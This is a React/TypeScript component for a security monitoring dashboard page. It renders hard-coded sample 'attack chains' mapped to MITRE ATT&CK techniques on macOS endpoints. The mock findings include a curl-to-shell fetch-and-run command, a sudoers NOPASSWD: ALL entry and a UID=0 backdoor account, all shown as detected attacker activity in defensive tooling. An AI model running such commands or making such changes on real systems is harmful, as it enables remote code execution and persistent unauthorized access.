import { useState } from "react";
import { GitBranch, ChevronRight, Clock } from "lucide-react";
import { PageHeader, SectionHeading, SevBadge } from "./shared";

interface ChainStep {
  technique: string;
  tactic: string;
  title: string;
  ts: string;
  severity: "critical" | "high" | "medium";
}

interface Chain {
  id: string;
  title: string;
  severity: "critical" | "high";
  score: number;
  agent_id: string;
  window: string;
  detected: string;
  steps: ChainStep[];
  status: string;
  description: string;
}

const CHAINS: Chain[] = [
  {
    id: "corr:ransomware_precursor",
    title: "Ransomware Precursor — 3-stage kill chain",
    severity: "critical",
    score: 9.6,
    agent_id: "mac-a1b2",
    window: "12h",
    detected: "14 min ago",
    status: "new",
    description: "Three independent signals within 12h: new LaunchDaemon (persistence) + SIP disabled (defense evasion) + data exfiltration volume spike. This sequence matches pre-encryption staging behavior documented in BlackCat/ALPHV and LockBit 3.0 incident reports.",
    steps: [
      { technique: "T1543.004", tactic: "Persistence",       title: "Unknown LaunchDaemon registered at 02:14",    ts: "02:14 UTC", severity: "critical" },
      { technique: "T1553.001", tactic: "Defense Evasion",   title: "SIP disabled via recoveryOS",                 ts: "02:31 UTC", severity: "critical" },
      { technique: "T1048",     tactic: "Exfiltration",      title: "847MB to external IP over HTTPS",             ts: "04:18 UTC", severity: "high"     },
    ],
  },
  {
    id: "corr:process_spawn_c2",
    title: "Macro Exploit → Shell → C2 Beacon",
    severity: "critical",
    score: 9.4,
    agent_id: "mac-a1b2",
    window: "6h",
    detected: "2h ago",
    status: "triaging",
    description: "Office document spawned bash, bash executed curl download, new process exhibits C2 beaconing behavior to a Feodo-tracked IP. This is the textbook initial-access-to-C2 chain for phishing campaigns. Time window: 43 minutes from Word open to active C2.",
    steps: [
      { technique: "T1566.001", tactic: "Initial Access",    title: "Word.app → /bin/bash (macro execution)",      ts: "09:14 UTC", severity: "critical" },
      { technique: "T1059.002", tactic: "Execution",         title: "bash → curl http://185.220.x.x/stage2 | sh",  ts: "09:15 UTC", severity: "critical" },
      { technique: "T1071.001", tactic: "C2",                title: "Beaconing to 185.220.101.47 (Feodo C2)",      ts: "09:57 UTC", severity: "critical" },
    ],
  },
  {
    id: "corr:cred_dump_lateral",
    title: "Credential Access → New Admin Account",
    severity: "high",
    score: 8.7,
    agent_id: "mac-c3d4",
    window: "24h",
    detected: "6h ago",
    status: "investigating",
    description: "sudo NOPASSWD entry added (privilege escalation), followed by UID=0 account creation (persistence via credential). Classic post-exploitation sequence: attacker escalates privileges then creates a back-door admin account for persistent access.",
    steps: [
      { technique: "T1548.003", tactic: "Privilege Escalation","title": "sudo NOPASSWD: ALL added to sudoers",      ts: "21:44 UTC", severity: "high"     },
      { technique: "T1136.001", tactic: "Persistence",        "title": "UID=0 account 'svc_backup' created",       ts: "21:52 UTC", severity: "critical" },
    ],
  },
  {
    id: "corr:beacon_implant",
    title: "Behavioral Anomaly + C2 Beaconing",
    severity: "high",
    score: 8.1,
    agent_id: "mac-e5f6",
    window: "12h",
    detected: "4h ago",
    status: "new",
    description: "CPU velocity spike (4.1× baseline — potential cryptominer or batch implant activity) co-occurring with low-entropy C2 beaconing. The combination of anomalous resource usage and fixed-interval outbound connections is a high-confidence indicator of active implant operation.",
    steps: [
      { technique: "T1496",     tactic: "Impact",             title: "CPU 4.1× above Welford baseline mean",        ts: "11:03 UTC", severity: "medium"   },
      { technique: "T1071.001", tactic: "C2",                 title: "Entropy 0.8 beaconing, 30s interval",         ts: "11:17 UTC", severity: "high"     },
    ],
  },
];

export default function AttackChains() {
  const [selected, setSelected] = useState<Chain | null>(null);

  return (
    <div>
      <PageHeader
        icon={<GitBranch className="w-6 h-6 text-[--red-600]" />}
        title="Attack Chains"
        subtitle="Time-gated MITRE ATT&CK correlations · multi-stage kill chain detection"
        backstory="Individual findings are symptoms; correlation chains are evidence of a campaign. The 2024 UNC3944 campaign (BlackCat ransomware) used exactly this sequence: persistence → defense evasion → credential access → exfiltration, spread over 72 hours. Our 21 time-gated correlation rules detect these multi-stage patterns by grouping findings within configurable time windows (6h–168h). A chain that fires means multiple independent signals have been detected on the same agent within a meaningful time window — this is not coincidence."
        accentClass="border-l-[--red-600]"
        bgClass="from-[--red-50]"
        tactics={["Multi-stage Detection", "Kill Chain Analysis", "MITRE ATT&CK"]}
        kpis={[
          { label: "Active Chains",   value: CHAINS.length,                                   color: "red"   },
          { label: "Critical",        value: CHAINS.filter(c => c.severity === "critical").length, color: "red"   },
          { label: "Agents Affected", value: new Set(CHAINS.map(c => c.agent_id)).size,        color: "amber" },
          { label: "Correlation Rules", value: 21,                                             color: "gray"  },
        ]}
      />

      <SectionHeading title="Active Correlation Chains" count={CHAINS.length} color="red" />

      <div className="grid gap-3">
        {CHAINS.map(chain => (
          <div
            key={chain.id}
            onClick={() => setSelected(selected?.id === chain.id ? null : chain)}
            className={`bg-white border rounded-lg shadow-card cursor-pointer transition-all hover:shadow-elevated ${chain.severity === "critical" ? "border-l-4 border-l-[--red-600]" : "border-l-4 border-l-[--amber-500]"} ${selected?.id === chain.id ? "ring-1 ring-[--brand-orange]" : ""}`}
          >
            <div className="p-4">
              <div className="flex items-start justify-between gap-4">
                <div className="flex items-start gap-3">
                  <SevBadge sev={chain.severity} />
                  <div>
                    <div className="font-semibold text-[--gray-900] text-sm">{chain.title}</div>
                    <div className="flex items-center gap-3 mt-1 text-[10px] text-[--gray-500]">
                      <span className="font-mono">{chain.agent_id}</span>
                      <span className="flex items-center gap-1"><Clock className="w-3 h-3" />{chain.window} window</span>
                      <span>{chain.detected}</span>
                      <span className="px-1.5 py-0.5 bg-[--indigo-50] text-[--indigo-600] border border-[--indigo-600]/20 rounded font-mono">{chain.id}</span>
                    </div>
                  </div>
                </div>
                <div className="flex items-center gap-2 flex-shrink-0">
                  <div className="text-right">
                    <div className="text-xl font-bold text-[--red-600]">{chain.score}</div>
                    <div className="text-[10px] text-[--gray-400]">chain score</div>
                  </div>
                </div>
              </div>

              {/* Kill chain steps */}
              <div className="flex items-start gap-1.5 mt-3 flex-wrap">
                {chain.steps.map((step, i) => (
                  <div key={i} className="flex items-center gap-1.5">
                    <div className={`px-2 py-1.5 rounded text-[10px] border ${
                      step.severity === "critical" ? "bg-[--red-50] border-[--red-600]/20 text-[--red-700]"
                      : step.severity === "high"   ? "bg-[--amber-50] border-[--amber-500]/20 text-[--amber-700]"
                      : "bg-[--blue-50] border-[--blue-600]/20 text-[--blue-700]"
                    }`}>
                      <div className="font-mono font-semibold">{step.technique}</div>
                      <div className="font-medium mt-0.5">{step.tactic}</div>
                      <div className="text-[9px] opacity-70 mt-0.5">{step.ts}</div>
                    </div>
                    {i < chain.steps.length - 1 && (
                      <ChevronRight className="w-3 h-3 text-[--gray-300] flex-shrink-0" />
                    )}
                  </div>
                ))}
              </div>
            </div>

            {/* Expanded description */}
            {selected?.id === chain.id && (
              <div className="px-4 pb-4 border-t border-[--gray-100] mt-2 pt-3">
                <div className="text-[10px] font-semibold text-[--gray-500] uppercase tracking-wide mb-1">Intelligence Context</div>
                <p className="text-xs text-[--gray-700] leading-relaxed">{chain.description}</p>
                <div className="flex gap-2 mt-3">
                  <button className="px-3 py-1.5 bg-[--brand-orange] text-white text-xs font-semibold rounded-md hover:bg-[--brand-orange-700] transition-colors">
                    Escalate to Incident
                  </button>
                  <button className="px-3 py-1.5 bg-[--gray-100] text-[--gray-700] text-xs font-semibold rounded-md hover:bg-[--gray-200] transition-colors">
                    View All Findings
                  </button>
                </div>
              </div>
            )}
          </div>
        ))}
      </div>
    </div>
  );
}
